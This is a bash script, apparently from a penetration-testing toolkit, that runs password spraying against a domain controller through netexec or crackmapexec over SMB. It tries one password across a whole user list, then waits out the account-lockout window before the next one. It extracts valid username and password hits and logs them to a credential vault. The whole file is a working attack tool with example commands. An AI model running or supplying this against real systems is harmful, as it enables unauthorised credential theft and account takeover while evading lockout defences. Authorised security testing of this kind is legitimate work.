#!/usr/bin/env bash
#
# spray.sh
#
# Password spraying via netexec/crackmapexec with a lockout-aware delay between
# passwords. Sprays one password across all users at a time, waits out the
# lockout window, then tries the next. Valid hits are logged to creds-vault.sh.
#
# Usage:
#   ./spray.sh 10.0.0.1 -d corp.local -U users.txt -p 'Spring2025!'
#   ./spray.sh 10.0.0.1 -d corp.local -U users.txt -P passwords.txt --delay 1800
#   ./spray.sh 10.0.0.1 -d corp.local -U users.txt -P pw.txt --vault ~/eng/creds/vault.tsv
#   ./spray.sh 10.0.0.1 -d corp.local -U users.txt -p 'x' --dry-run
#
# Lockout safety: with a password LIST, only ONE password is tried per --delay
# window. Check the domain policy first (e.g. nxc smb DC -u u -p p --pass-pol)
# and set --delay above the lockout observation window.
#
set -uo pipefail

DOMAIN=""
USERS=""
ONEPASS=""
PASSLIST=""
DELAY=1800
VAULT=""
DRY_RUN=0

die()  { echo "ERROR: $*" >&2; exit 1; }
have() { command -v "$1" >/dev/null 2>&1; }

usage() {
  grep '^#' "$0" | sed 's/^# \{0,1\}//' | sed '/^!/d'
  exit "${1:-0}"
}

cme_bin() {
  if have nxc; then echo nxc
  elif have netexec; then echo netexec
  elif have crackmapexec; then echo crackmapexec
  else return 1; fi
}

# --- parse args -----------------------------------------------------------
DC=""
while [ $# -gt 0 ]; do
  case "$1" in
    -h|--help)   usage 0 ;;
    -d|--domain) shift; [ $# -gt 0 ] || die "-d needs a value"; DOMAIN="$1" ;;
    -U|--users)  shift; [ $# -gt 0 ] || die "-U needs a path"; USERS="$1" ;;
    -p|--pass)   shift; [ $# -gt 0 ] || die "-p needs a value"; ONEPASS="$1" ;;
    -P|--passes) shift; [ $# -gt 0 ] || die "-P needs a path"; PASSLIST="$1" ;;
    --delay)     shift; [ $# -gt 0 ] || die "--delay needs seconds"; DELAY="$1" ;;
    --delay=*)   DELAY="${1#*=}" ;;
    --vault)     shift; [ $# -gt 0 ] || die "--vault needs a path"; VAULT="$1" ;;
    --vault=*)   VAULT="${1#*=}" ;;
    --dry-run|-n) DRY_RUN=1 ;;
    -*)          die "Unknown option: $1 (try --help)" ;;
    *)           [ -z "$DC" ] || die "Only one target allowed."; DC="$1" ;;
  esac
  shift
done
[ -n "$DC" ]    || { echo "No domain controller/target given." >&2; usage 2; }
[ -n "$USERS" ] || { echo "No user list (-U) given." >&2; usage 2; }
[ -f "$USERS" ] || die "User list not found: $USERS"
[ -n "$ONEPASS$PASSLIST" ] || { echo "Give -p PASSWORD or -P passfile." >&2; usage 2; }
[ -z "$PASSLIST" ] || [ -f "$PASSLIST" ] || die "Password list not found: $PASSLIST"

CME=$(cme_bin) || { [ "$DRY_RUN" -eq 1 ] && CME="nxc" || die "netexec/crackmapexec not found."; }

# Build the password vector.
passwords=()
if [ -n "$ONEPASS" ]; then passwords=("$ONEPASS"); fi
if [ -n "$PASSLIST" ]; then
  while IFS= read -r pw; do [ -n "$pw" ] && passwords+=("$pw"); done < "$PASSLIST"
fi

echo ">> Target : $DC   Domain: $DOMAIN"
echo ">> Users  : $USERS ($(grep -c '' "$USERS") entries)"
echo ">> Passwords to spray: ${#passwords[@]}   Delay between: ${DELAY}s"
echo

log_hit() { # user pass
  echo "   [+] VALID: $1 : $2"
  if [ -n "$VAULT" ] && [ -x "$(command -v ./creds-vault.sh 2>/dev/null)" ] 2>/dev/null; then :; fi
  if [ -n "$VAULT" ]; then
    if [ -f ./creds-vault.sh ]; then
      ./creds-vault.sh --file "$VAULT" add --host "$DC" --service smb --user "$1" --secret "$2" --source spray >/dev/null 2>&1 || true
    fi
  fi
}

domain_arg=(-d "$DOMAIN")
[ -n "$DOMAIN" ] || domain_arg=()

idx=0
for pw in "${passwords[@]}"; do
  idx=$((idx+1))
  echo ">> [$idx/${#passwords[@]}] Spraying password against all users..."
  if [ "$DRY_RUN" -eq 1 ]; then
    echo "   [dry-run] $CME smb $DC -u $USERS -p '<pw $idx>' ${domain_arg[*]} --continue-on-success"
  else
    out=$("$CME" smb "$DC" -u "$USERS" -p "$pw" "${domain_arg[@]}" --continue-on-success 2>&1)
    echo "$out" | grep -E '\[\+\]' || echo "   (no valid creds this round)"
    # netexec marks success with [+] domain\user:pass and no '(Pwn3d!)' needed
    while IFS= read -r line; do
      u=$(printf '%s' "$line" | grep -oE '\\[^:]+:' | tr -d '\\:' | head -n1)
      [ -n "$u" ] && log_hit "$u" "$pw"
    done < <(printf '%s\n' "$out" | grep -E '\[\+\]')
  fi

  # Wait out the lockout window before the next password (skip after the last).
  if [ "$idx" -lt "${#passwords[@]}" ]; then
    echo ">> Sleeping ${DELAY}s before the next password (lockout safety)..."
    [ "$DRY_RUN" -eq 1 ] && echo "   [dry-run] sleep $DELAY" || sleep "$DELAY"
  fi
done

echo
echo ">> Spray complete. Review [+] lines above; hits logged to ${VAULT:-'(no --vault)'}."
